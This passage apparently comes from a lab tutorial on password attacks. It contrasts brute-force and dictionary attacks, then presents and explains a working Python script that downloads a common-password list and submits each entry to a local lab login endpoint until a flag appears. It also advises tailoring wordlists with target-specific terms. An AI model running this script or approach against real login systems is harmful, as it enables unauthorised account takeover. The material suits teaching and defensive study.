While comprehensive, the brute-force approach can be time-consuming and resource-intensive, especially when dealing with complex passwords. That’s where dictionary attacks come in.

---

# The Power of Words

The effectiveness of a dictionary attack lies in its ability to exploit the human tendency to prioritize memorable passwords over secure ones.

Despite repeated security warnings, many individuals still choose passwords based on:
- Dictionary words
- Common phrases
- Names
- Predictable patterns
- Easily guessable information

This predictability makes users vulnerable to dictionary attacks.

In a dictionary attack, attackers systematically test a pre-defined list of likely passwords against the target system.

The success of the attack depends heavily on:
```text
The quality and specificity of the wordlist
```

A well-crafted wordlist tailored to the target environment can dramatically improve the chances of success.

For example:
- If the target system belongs to gamers, a gaming-related wordlist would be more effective than a generic dictionary.
- If targeting a company, employee names, department names, or company-specific terms may be added to the wordlist.

The closer the wordlist reflects the likely password choices of the target:
```text
The higher the probability of compromise
```

At its core, dictionary attacks exploit:
```text
Human predictability
```

rather than raw computational power.

This makes dictionary attacks significantly more efficient than traditional brute-force attacks in many real-world situations.

---

# Brute Force vs Dictionary Attack

The primary difference between a brute-force attack and a dictionary attack lies in:
```text
How password candidates are generated
```

---

# Brute Force Attack

A brute-force attack systematically tests:
```text
Every possible combination
```

of characters within a specified character set and password length.

Although brute force guarantees eventual success given enough time:
- It is extremely resource-intensive
- It becomes impractical against long or complex passwords

---

# Dictionary Attack

A dictionary attack uses:
```text
A pre-compiled list of likely passwords
```

instead of generating all possible combinations.

This dramatically reduces:
- Search space
- Time required
- Computational overhead

Dictionary attacks are especially effective when:
- Weak passwords are used
- Password reuse exists
- Users choose common phrases or predictable words

---

# Comparison Table

| Feature | Dictionary Attack | Brute Force Attack | Explanation |
|----------|------------------|-------------------|-------------|
| Efficiency | Faster and resource-efficient | Extremely time-consuming | Dictionary attacks narrow the search space using pre-defined passwords |
| Targeting | Highly adaptable | No inherent targeting | Wordlists can include target-specific information |
| Effectiveness | Effective against weak/common passwords | Effective against all passwords | Brute force works universally but may take impractical amounts of time |
| Limitations | Fails against random passwords | Often infeasible against complex passwords | Long random passwords create massive search spaces |

# Throwing a Dictionary at the Problem

# Python Dictionary Attack Script

```python
import requests

ip = "127.0.0.1"  # Change this to your instance IP address
port = 1234       # Change this to your instance port number

# Download a list of common passwords
passwords = requests.get(
    "https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/500-worst-passwords.txt"
).text.splitlines()

# Try each password
for password in passwords:

    print(f"Attempted password: {password}")

    # Send POST request
    response = requests.post(
        f"http://{ip}:{port}/dictionary",
        data={'password': password}
    )

    # Check for successful login
    if response.ok and 'flag' in response.json():

        print(f"Correct password found: {password}")
        print(f"Flag: {response.json()['flag']}")

        break
```

---

# How the Script Works

The script automates a dictionary attack against the web application.

---

# Step 1 - Download Wordlist

The script downloads:
```text
500 common weak passwords
```

from the SecLists repository using:

```python
requests.get()
```

The passwords are then split into individual lines using:

```python
.splitlines()
```

---

# Step 2 - Iterate Through Passwords

The script loops through every password in the wordlist:

```python
for password in passwords:
```

Each password becomes a login attempt.

---

# Step 3 - Send POST Request

For every password:
- A POST request is sent
- The password is included in the request body

Example:

```python
requests.post(
    f"http://{ip}:{port}/dictionary",
    data={'password': password}
)
```

---

# Step 4 - Analyze the Response

After every request:
- The status code is checked
- The response body is inspected

If:
```python
response.ok
```

and:
```python
'flag' in response.json()
```

then:
```text
Authentication succeeded
```

The script prints:
- Correct password
- Captured flag

and exits.

---

# Step 5 - Continue Until Success

If authentication fails:
- The script moves to the next password
- The process repeats automatically

The attack continues until:
- The correct password is found
- Or the wordlist is exhausted

# Why Dictionary Attacks Are Effective

Dictionary attacks are highly effective because many users:
- Reuse passwords
- Use weak passwords
- Choose memorable phrases
- Prefer convenience over security

This human behavior dramatically reduces password entropy and makes predictable passwords vulnerable.

---

# Key Takeaways

- Dictionary attacks use pre-defined password lists instead of testing every possible combination
- They are significantly faster and more efficient than brute-force attacks
- Success depends heavily on wordlist quality and target-specific customization
- Human predictability is the main weakness exploited by dictionary attacks
- Wordlists such as `rockyou.txt` and SecLists are commonly used during password attacks
